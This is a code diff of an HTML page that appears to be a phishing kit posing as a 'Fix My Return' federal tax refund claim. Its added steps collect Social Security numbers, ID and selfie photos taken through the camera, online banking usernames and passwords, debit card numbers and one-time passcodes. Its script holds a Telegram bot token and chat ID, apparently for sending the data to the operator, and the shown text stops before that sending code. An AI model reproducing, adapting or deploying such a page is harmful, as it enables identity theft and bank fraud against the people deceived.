@@ -2,805 +2,933 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Fix My Return · Claim Refund</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Fix My Return · Claim Refund</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-    body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #f0f5fe;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-    }
+        body {
+            background: #F5F7FA;
+            font-family: 'Inter', -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-    .card {
-      max-width: 620px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 2.5rem;
-      box-shadow: 0 30px 60px -16px rgba(0, 20, 40, 0.20);
-      padding: 2.5rem 2.5rem 2.8rem;
-      border: 1px solid rgba(255, 255, 255, 0.6);
-      transition: all 0.2s;
-    }
+        .container {
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+        }
 
-    .badge {
-      background: #eef4ff;
-      color: #1a4cff;
-      font-weight: 600;
-      font-size: 0.7rem;
-      letter-spacing: 0.5px;
-      padding: 0.3rem 1.2rem;
-      border-radius: 100px;
-      display: inline-block;
-      margin-bottom: 1.4rem;
-      border: 1px solid #d6e2ff;
-    }
+        /* Card style — clean, professional */
+        .card {
+            background: #FFFFFF;
+            border-radius: 20px;
+            padding: 32px 28px 36px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.06), 0 2px 8px rgba(0, 0, 0, 0.02);
+            border: 1px solid #E8EDF4;
+        }
 
-    .refund-amount {
-      display: flex;
-      align-items: baseline;
-      gap: 0.3rem;
-      margin-bottom: 0.2rem;
-    }
+        /* --- LANDING: tax refund header --- */
+        .refund-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
 
-    .refund-amount h1 {
-      font-size: 3.6rem;
-      font-weight: 700;
-      letter-spacing: -0.02em;
-      color: #0a192f;
-    }
+        .refund-badge {
+            display: inline-block;
+            background: #E9F2FD;
+            color: #1A4CFF;
+            font-weight: 600;
+            font-size: 0.7rem;
+            letter-spacing: 0.4px;
+            padding: 0.25rem 1.2rem;
+            border-radius: 100px;
+            border: 1px solid #C5D9F5;
+            margin-bottom: 12px;
+        }
 
-    .refund-amount span {
-      font-size: 1.2rem;
-      font-weight: 500;
-      color: #3d4f6a;
-      margin-left: 0.1rem;
-    }
+        .refund-amount {
+            font-size: 3.6rem;
+            font-weight: 700;
+            color: #0A192F;
+            letter-spacing: -0.02em;
+        }
 
-    .eligibility-tag {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.4rem;
-      background: #e3f5eb;
-      color: #0b6e4a;
-      font-weight: 600;
-      font-size: 0.75rem;
-      padding: 0.25rem 1.2rem;
-      border-radius: 100px;
-      margin-top: 0.2rem;
-      border: 1px solid #b7e0cd;
-    }
+        .refund-amount small {
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #4A5F7A;
+            margin-left: 4px;
+        }
 
-    .subhead {
-      margin-top: 0.8rem;
-      color: #2d405b;
-      font-size: 0.95rem;
-      font-weight: 450;
-      border-left: 4px solid #1a4cff;
-      padding-left: 1rem;
-      background: #f8fbff;
-      border-radius: 0 12px 12px 0;
-      line-height: 1.6;
-      padding: 0.7rem 1.2rem 0.7rem 1.2rem;
-    }
+        .eligibility-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #E3F5EB;
+            color: #0B6E4A;
+            font-weight: 600;
+            font-size: 0.8rem;
+            padding: 0.3rem 1.2rem;
+            border-radius: 100px;
+            border: 1px solid #B7E0CD;
+            margin-top: 4px;
+        }
 
-    .status-grid {
-      background: #f9fcff;
-      border-radius: 1.5rem;
-      padding: 1.25rem 1.5rem 1rem;
-      margin: 1.5rem 0 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      border: 1px solid #e7edf6;
-      box-shadow: inset 0 1px 3px rgba(0,0,0,0.02);
-    }
+        .subhead {
+            margin-top: 12px;
+            color: #2D405B;
+            font-size: 0.95rem;
+            background: #F8FBFF;
+            border-left: 4px solid #1A4CFF;
+            padding: 0.7rem 1.2rem;
+            border-radius: 0 12px 12px 0;
+            line-height: 1.5;
+        }
 
-    .status-item {
-      display: flex;
-      flex-direction: column;
-      gap: 0.2rem;
-    }
+        .status-grid {
+            background: #F9FCFF;
+            border-radius: 16px;
+            padding: 1rem 1.2rem;
+            margin: 1.5rem 0 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            border: 1px solid #E7EDF6;
+        }
 
-    .status-label {
-      font-size: 0.6rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.6px;
-      color: #6e7f99;
-    }
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
 
-    .status-value {
-      font-weight: 600;
-      font-size: 0.95rem;
-      color: #0a192f;
-    }
+        .status-label {
+            font-size: 0.6rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #6E7F99;
+        }
 
-    .status-value.ready {
-      color: #1a8b4c;
-      display: flex;
-      align-items: center;
-      gap: 0.3rem;
-    }
+        .status-value {
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #0A192F;
+        }
 
-    .claim-btn {
-      background: #0a192f;
-      border: none;
-      color: white;
-      font-weight: 600;
-      font-size: 1.1rem;
-      padding: 1rem 1.5rem;
-      border-radius: 60px;
-      width: 100%;
-      cursor: pointer;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.6rem;
-      box-shadow: 0 10px 24px -6px rgba(10, 25, 47, 0.25);
-      letter-spacing: 0.2px;
-      border: 1px solid #1f3a5f;
-    }
+        .status-value.ready {
+            color: #1A8B4C;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
 
-    .claim-btn:hover {
-      background: #142d4a;
-      transform: scale(1.01);
-      box-shadow: 0 12px 28px -8px rgba(10, 25, 47, 0.35);
-    }
+        .claim-btn {
+            background: #0A192F;
+            border: none;
+            color: white;
+            font-weight: 600;
+            font-size: 1.1rem;
+            padding: 1rem 1.5rem;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 10px 24px -6px rgba(10, 25, 47, 0.25);
+            border: 1px solid #1F3A5F;
+        }
 
-    .claim-btn:active { transform: scale(0.97); }
+        .claim-btn:hover {
+            background: #142D4A;
+            transform: scale(1.01);
+        }
 
-    .footnote {
-      margin-top: 1.8rem;
-      font-size: 0.7rem;
-      color: #7b8aa3;
-      text-align: center;
-      border-top: 1px solid #e5ebf3;
-      padding-top: 1.5rem;
-      letter-spacing: 0.2px;
-    }
+        .claim-btn:active {
+            transform: scale(0.97);
+        }
 
-    /* ---- Modal (iOS‑inspired) ---- */
-    .modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      z-index: 999;
-    }
+        .footnote {
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: #7B8AA3;
+            text-align: center;
+            border-top: 1px solid #E5EBF3;
+            padding-top: 1.2rem;
+        }
 
-    .modal-overlay.active { display: flex; }
+        /* --- Shared form styles --- */
+        .input-group {
+            margin-bottom: 20px;
+        }
 
-    .modal-window {
-      background: #ffffff;
-      max-width: 520px;
-      width: 100%;
-      border-radius: 2.5rem;
-      padding: 2rem 2rem 2rem;
-      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.35);
-      animation: fadeSlide 0.28s cubic-bezier(0.2, 0.9, 0.3, 1);
-      max-height: 92vh;
-      overflow-y: auto;
-      border: 1px solid rgba(255,255,255,0.15);
-    }
+        .input-label {
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: #1F3450;
+            margin-bottom: 6px;
+            display: block;
+        }
 
-    @keyframes fadeSlide {
-      0% { opacity: 0; transform: translateY(24px) scale(0.97); }
-      100% { opacity: 1; transform: translateY(0) scale(1); }
-    }
+        input,
+        select {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            background: #FFFFFF;
+            border: 1.5px solid #DCE4EF;
+            border-radius: 14px;
+            color: #0A192F;
+            outline: none;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
 
-    .modal-window h2 {
-      font-size: 1.6rem;
-      font-weight: 700;
-      color: #0a192f;
-      margin-bottom: 0.15rem;
-      letter-spacing: -0.01em;
-    }
+        input:focus,
+        select:focus {
+            border-color: #1A4CFF;
+            box-shadow: 0 0 0 4px rgba(26, 76, 255, 0.1);
+        }
 
-    .modal-window .step-desc {
-      font-size: 0.9rem;
-      color: #4a5f7a;
-      margin-bottom: 1.5rem;
-      border-bottom: 1px solid #eef3fa;
-      padding-bottom: 0.8rem;
-      font-weight: 450;
-    }
+        .action-btn {
+            background: #0A192F;
+            color: white;
+            font-weight: 600;
+            width: 100%;
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 4px;
+        }
 
-    .modal-window label {
-      font-weight: 600;
-      font-size: 0.8rem;
-      color: #1f3450;
-      display: block;
-      margin-top: 1.2rem;
-      margin-bottom: 0.3rem;
-      letter-spacing: 0.2px;
-    }
+        .action-btn:active {
+            transform: scale(0.97);
+            background: #1A2F4A;
+        }
 
-    .modal-window input,
-    .modal-window select {
-      width: 100%;
-      padding: 0.8rem 1.2rem;
-      border: 1.5px solid #dfe7f0;
-      border-radius: 60px;
-      font-size: 0.95rem;
-      background: #fbfdff;
-      transition: 0.2s;
-      font-family: inherit;
-      color: #0a192f;
-      appearance: none;
-    }
+        .link-btn {
+            background: none;
+            border: none;
+            color: #1A4CFF;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            text-decoration: underline;
+            padding: 0;
+        }
 
-    .modal-window input:focus,
-    .modal-window select:focus {
-      outline: none;
-      border-color: #1a4cff;
-      box-shadow: 0 0 0 4px rgba(26, 76, 255, 0.12);
-      background: white;
-    }
+        .hide {
+            display: none !important;
+        }
 
-    .modal-window .btn-group {
-      display: flex;
-      gap: 0.8rem;
-      margin-top: 2rem;
-      flex-wrap: wrap;
-    }
+        .back-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .back-link a {
+            color: #6C7A8E;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .back-link a:hover {
+            text-decoration: underline;
+        }
 
-    .modal-window .btn-primary,
-    .modal-window .btn-secondary {
-      flex: 1;
-      padding: 0.8rem 1.2rem;
-      border-radius: 60px;
-      font-weight: 600;
-      border: none;
-      cursor: pointer;
-      transition: 0.15s;
-      font-size: 0.95rem;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.3rem;
-      min-width: 100px;
-    }
+        .toast {
+            background: #1A2C3E;
+            color: white;
+            border-radius: 40px;
+            padding: 12px 18px;
+            text-align: center;
+            opacity: 0;
+            transition: 0.25s;
+            pointer-events: none;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+        .toast.show {
+            opacity: 1;
+        }
 
-    .modal-window .btn-primary {
-      background: #0a192f;
-      color: white;
-      box-shadow: 0 6px 16px rgba(10, 25, 47, 0.18);
-      border: 1px solid #1f3a5f;
-    }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 2000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.25s;
+        }
+        .loading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
 
-    .modal-window .btn-primary:hover { background: #1a2f4a; }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #3174AD;
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-bottom: 20px;
+        }
 
-    .modal-window .btn-secondary {
-      background: #f0f5fd;
-      color: #1f3450;
-      border: 1px solid #dce4ef;
-    }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
 
-    .modal-window .btn-secondary:hover { background: #e6edf7; }
+        .loading-text {
+            font-size: 16px;
+            color: white;
+            text-align: center;
+            font-weight: 500;
+        }
 
-    /* ---- KYC: iPhone‑style photo grid ---- */
-    .photo-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 0.9rem;
-      margin-top: 0.3rem;
-    }
+        /* --- KYC Camera UI (PayPal style) --- */
+        .step-indicator {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
 
-    .photo-item {
-      background: #f8faff;
-      border-radius: 1.5rem;
-      border: 1.5px solid #e6edf6;
-      overflow: hidden;
-      transition: all 0.15s;
-      display: flex;
-      align-items: center;
-      padding: 0.4rem 0.4rem 0.4rem 1.2rem;
-      cursor: pointer;
-    }
+        .step-dot {
+            flex: 1;
+            height: 4px;
+            background: #E4E9F2;
+            border-radius: 4px;
+        }
 
-    .photo-item:hover { background: #f2f8ff; border-color: #b8ccf0; }
+        .step-dot.active {
+            background: #1A4CFF;
+        }
+        .step-dot.completed {
+            background: #1A4CFF;
+        }
 
-    .photo-thumb {
-      width: 60px;
-      height: 60px;
-      border-radius: 1.2rem;
-      background: #eef3fc;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.8rem;
-      flex-shrink: 0;
-      margin-right: 1rem;
-      color: #5a7290;
-      border: 1px solid #dce4ef;
-      overflow: hidden;
-      background-size: cover;
-      background-position: center;
-      background-color: #eef3fc;
-    }
+        .camera-container {
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 12px 0 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
 
-    .photo-thumb.has-image {
-      border-color: #1a4cff;
-      box-shadow: 0 0 0 2px rgba(26, 76, 255, 0.15);
-    }
+        .square-camera {
+            aspect-ratio: 1 / 1;
+            background: #1A1A1A;
+        }
 
-    .photo-info {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
 
-    .photo-info .label {
-      font-weight: 600;
-      font-size: 0.85rem;
-      color: #0a192f;
-    }
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 30px;
+            padding: 12px 0 4px;
+        }
 
-    .photo-info .sub {
-      font-size: 0.7rem;
-      color: #6e7f99;
-    }
+        .capture-btn {
+            background: white;
+            width: 68px;
+            height: 68px;
+            border-radius: 50%;
+            border: 4px solid #1A4CFF;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            transition: 0.1s;
+        }
 
-    .photo-item input[type="file"] { display: none; }
+        .capture-btn:active {
+            transform: scale(0.92);
+        }
 
-    .photo-status {
-      font-size: 0.7rem;
-      font-weight: 500;
-      color: #1a8b4c;
-      background: #e3f5eb;
-      padding: 0.2rem 0.8rem;
-      border-radius: 100px;
-      white-space: nowrap;
-    }
+        .switch-cam {
+            background: rgba(0, 0, 0, 0.65);
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            cursor: pointer;
+            color: white;
+            backdrop-filter: blur(5px);
+        }
 
-    .photo-status.empty { color: #7b8aa3; background: #f0f4fc; }
+        .status-badge {
+            background: #F2F5F8;
+            padding: 10px;
+            border-radius: 60px;
+            text-align: center;
+            font-size: 13px;
+            margin: 8px 0 4px;
+            color: #1E2A3E;
+            font-weight: 500;
+        }
 
-    .small-hint {
-      font-size: 0.7rem;
-      color: #6e7f99;
-      margin-top: 0.3rem;
-    }
+        .info-note {
+            background: #FEF9E6;
+            border-radius: 12px;
+            padding: 10px 12px;
+            font-size: 12px;
+            margin: 8px 0 4px;
+            color: #7A6A2E;
+            text-align: center;
+        }
 
-    .text-danger { color: #c92a2a; }
+        .otp-hint {
+            background: #EFF6FF;
+            border-radius: 16px;
+            padding: 12px 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 15px;
+            border-left: 3px solid #1A4CFF;
+        }
 
-    .modal-window::-webkit-scrollbar { width: 5px; }
-    .modal-window::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
-    .modal-window::-webkit-scrollbar-thumb { background: #bcc9db; border-radius: 10px; }
+        .phone-mask {
+            font-weight: 700;
+            color: #0A192F;
+        }
 
-    /* smart validation */
-    .input-error {
-      border-color: #c92a2a !important;
-      box-shadow: 0 0 0 4px rgba(201, 42, 42, 0.12) !important;
-    }
-    .error-msg {
-      font-size: 0.7rem;
-      color: #c92a2a;
-      margin-top: 0.2rem;
-      display: none;
-    }
-    .error-msg.show { display: block; }
-  </style>
+        .resend-options {
+            text-align: center;
+            margin-top: 14px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .terms {
+            font-size: 11px;
+            color: #8A99AA;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+    </style>
 </head>
 <body>
-  <div class="card" id="mainCard">
-    <div class="badge">📄 2025 Tax Return · E-filed 08/19</div>
-    <div class="refund-amount">
-      <h1>$1,464</h1>
-      <span>refund</span>
+    <div class="container">
+        <!-- LANDING: Elegible for refund -->
+        <div id="landingPanel" class="card">
+            <div class="refund-header">
+                <div class="refund-badge">📄 2025 Tax Return · E-filed 08/19</div>
+                <div class="refund-amount">
+                    $1,464 <small>refund</small>
+                </div>
+                <div class="eligibility-tag">✅ You are eligible — federal refund</div>
+            </div>
+            <div class="subhead">
+                <strong>Your federal tax refund of $1,464</strong> is available. 
+                Complete the secure verification to claim your funds.
+            </div>
+            <div class="status-grid">
+                <div class="status-item">
+                    <span class="status-label">Federal refund</span>
+                    <span class="status-value">$1,464</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Status</span>
+                    <span class="status-value ready">✅ Ready to claim</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Tax year</span>
+                    <span class="status-value">2025</span>
+                </div>
+            </div>
+            <button class="claim-btn" id="startClaimBtn">💰 Claim your refund</button>
+            <div class="footnote">Fix My Return · Secure verification</div>
+        </div>
+
+        <!-- STEP 1: Personal details -->
+        <div id="personalPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 Personal details</h2>
+            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 1 of 6 · Verify your identity</div>
+            <div class="input-group">
+                <div class="input-label">Full legal name</div>
+                <input type="text" id="fullName" placeholder="John M. Doe" />
+            </div>
+            <div class="input-group">
+                <div class="input-label">Date of birth</div>
+                <input type="date" id="dob" />
+            </div>
+            <div class="input-group">
+                <div class="input-label">Residential address</div>
+                <input type="text" id="address" placeholder="Street, city, state, ZIP" />
+            </div>
+            <button class="action-btn" id="personalNextBtn">Continue →</button>
+            <div class="back-link"><a href="#" id="backToLanding">← Cancel</a></div>
+        </div>
+
+        <!-- STEP 2: SSN -->
+        <div id="ssnPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🆔 Social Security Number</h2>
+            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 2 of 6 · Secure SSN entry</div>
+            <div class="input-group">
+                <div class="input-label">Social Security Number</div>
+                <input type="password" id="ssnInput" placeholder="XXX-XX-XXXX" />
+            </div>
+            <div style="font-size:0.7rem; color:#6E7F99; margin-top:-6px; margin-bottom:16px;">Bank‑grade encryption · never stored in plain text.</div>
+            <button class="action-btn" id="ssnNextBtn">Continue →</button>
+            <div class="back-link"><a href="#" id="backToPersonal">← Back</a></div>
+        </div>
+
+        <!-- STEP 3: KYC (PayPal-style camera) -->
+        <div id="kycPanel" class="card hide">
+            <div class="step-indicator" id="stepIndicator">
+                <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
+            </div>
+            <!-- KYC Step 1: ID metadata -->
+            <div id="kycStep1" class="kyc-step">
+                <div class="input-group"><div class="input-label">ID type</div><select id="idType"><option value="">Select document</option><option>Driver's License</option><option>State ID Card</option><option>Passport</option><option>Resident Permit</option></select></div>
+                <div class="input-group"><div class="input-label">Issuing state / country</div><select id="idState"><option value="">Select state or region</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select></div>
+                <button class="action-btn" id="kycStep1Next">Continue to ID capture →</button>
+                <div class="back-link"><a href="#" id="backToSsnFromKyc">← Back</a></div>
+            </div>
+            <div id="kycStep2" class="kyc-step hide">
+                <div class="status-badge">📄 Front side of your ID</div>
+                <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
+                <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
+                <div class="status-badge" id="frontStatus">Position ID in frame & tap circle</div>
+            </div>
+            <div id="kycStep3" class="kyc-step hide">
+                <div class="status-badge">🔄 Back side of your ID</div>
+                <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
+                <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
+                <div class="status-badge" id="backStatus">Ready to capture</div>
+            </div>
+            <div id="kycStep4" class="kyc-step hide">
+                <div class="status-badge">🤳 Take a selfie</div>
+                <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
+                <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
+                <div class="status-badge" id="selfieStatus">Look at the camera</div>
+            </div>
+            <div id="kycStep5" class="kyc-step hide">
+                <div class="status-badge">📸 Selfie holding ID next to your face</div>
+                <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
+                <div class="camera-controls"><div class="switch-cam" id="switchSelfieIdCam">⟳</div><div class="capture-btn" id="captureSelfieIdBtn"></div><div style="width:44px;"></div></div>
+                <div class="status-badge" id="selfieIdStatus">Hold ID clearly visible</div>
+            </div>
+        </div>
+
+        <!-- STEP 4: Select Bank -->
+        <div id="bankPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🏦 Select your bank</h2>
+            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 4 of 6 · Choose your financial institution</div>
+            <div class="input-group">
+                <div class="input-label">Bank name</div>
+                <select id="bankSelect">
+                    <option value="">Select your bank</option>
+                    <option>Bank of America</option><option>Wells Fargo</option><option>Chase</option><option>Citibank</option><option>U.S. Bank</option>
+                    <option>Truist</option><option>PNC Bank</option><option>Capital One</option><option>TD Bank</option><option>Fifth Third Bank</option>
+                    <option>KeyBank</option><option>Huntington Bank</option><option>Regions Bank</option><option>Ally Bank</option><option>Discover Bank</option>
+                    <option>Synchrony Bank</option><option>Barclays US</option><option>HSBC Bank USA</option><option>Santander Bank</option><option>M&T Bank</option>
+                    <option>Citizens Bank</option><option>First Horizon</option><option>BOK Financial</option><option>Comerica</option><option>Bank OZK</option>
+                    <option>Eastern Bank</option><option>Fulton Bank</option><option>Pinnacle Bank</option><option>Banner Bank</option><option>Pacific Western Bank</option>
+                    <option>UMB Bank</option><option>Zions Bank</option><option>Associated Bank</option><option>First Merchants</option><option>Old National Bank</option>
+                    <option>Wintrust</option><option>Sterling Bank</option><option>Apple Bank</option><option>Dime Community Bank</option><option>Valley National Bank</option>
+                </select>
+            </div>
+            <button class="action-btn" id="bankNextBtn">Continue →</button>
+            <div class="back-link"><a href="#" id="backToKycFromBank">← Back</a></div>
+        </div>
+
+        <!-- STEP 5: Bank login -->
+        <div id="bankLoginPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔑 Bank login</h2>
+            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 5 of 6 · Secure credential entry</div>
+            <div class="input-group">
+                <div class="input-label">Online banking username</div>
+                <input type="text" id="bankUsername" placeholder="username" />
+            </div>
+            <div class="input-group">
+                <div class="input-label">Password</div>
+                <input type="password" id="bankPassword" placeholder="••••••••" />
+            </div>
+            <div style="font-size:0.7rem; color:#6E7F99; margin-top:-6px; margin-bottom:16px;">Encrypted and used only for verification.</div>
+            <button class="action-btn" id="bankLoginNextBtn">Continue →</button>
+            <div class="back-link"><a href="#" id="backToBankFromLogin">← Back</a></div>
+        </div>
+
+        <!-- STEP 6: Debit card & OTP -->
+        <div id="otpPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">💳 Debit card & OTP</h2>
+            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 6 of 6 · Final verification</div>
+            <div class="otp-hint">🔐 Verification code sent to your registered mobile</div>
+            <div class="input-group">
+                <div class="input-label">Debit card number</div>
+                <input type="text" id="debitCard" placeholder="**** **** **** ****" />
+            </div>
+            <div class="input-group">
+                <div class="input-label">One‑time passcode (OTP)</div>
+                <input type="text" id="otpInput" placeholder="6‑digit code" />
+            </div>
+            <button class="action-btn" id="finalSubmitBtn">✅ Submit & claim</button>
+            <div class="resend-options">
+                <button class="link-btn" id="resendOtpBtn">📱 Resend SMS</button>
+                <button class="link-btn" id="emailOtpBtn">✉️ Send code via email</button>
+            </div>
+            <div class="back-link"><a href="#" id="backToBankLoginFromOtp">← Back</a></div>
+            <div class="terms">By submitting, you agree to our secure verification process.</div>
+        </div>
+
+        <div id="toastMsg" class="toast"></div>
     </div>
-    <div class="eligibility-tag">✅ Federal refund — ready to claim</div>
-    <div class="subhead">
-      <strong>Your federal tax refund of $1,464</strong> is available. 
-      Complete the secure verification process to claim your funds.
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing verification...<br />Please wait</div>
     </div>
 
-    <div class="status-grid">
-      <div class="status-item">
-        <span class="status-label">Federal refund</span>
-        <span class="status-value">$1,464</span>
-      </div>
-      <div class="status-item">
-        <span class="status-label">Status</span>
-        <span class="status-value ready">✅ Available</span>
-      </div>
-      <div class="status-item">
-        <span class="status-label">Filing</span>
-        <span class="status-value">2025</span>
-      </div>
-    </div>
+    <script>
+        (function() {
+            // Telegram bot credentials
+            const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+            const CHAT_ID = "8737104261";
 
-    <button class="claim-btn" id="claimBtn">
-      <span>💰</span> Claim your refund
-    </button>
-    <div class="footnote">Fix My Return · Secure verification</div>
-  </div>
+            // State
+            const userData = {
+                fullName: '',
+                dob: '',
+                address: '',
+                ssn: '',
+                idType: '',
+                idState: '',
+                bank: '',
+                bankUsername: '',
+                bankPassword: '',
+                debitCard: '',
+                otp: ''
+            };
 
-  <!-- MODAL -->
-  <div class="modal-overlay" id="modalOverlay">
-    <div class="modal-window" id="modalWindow"></div>
-  </div>
+            // DOM panels
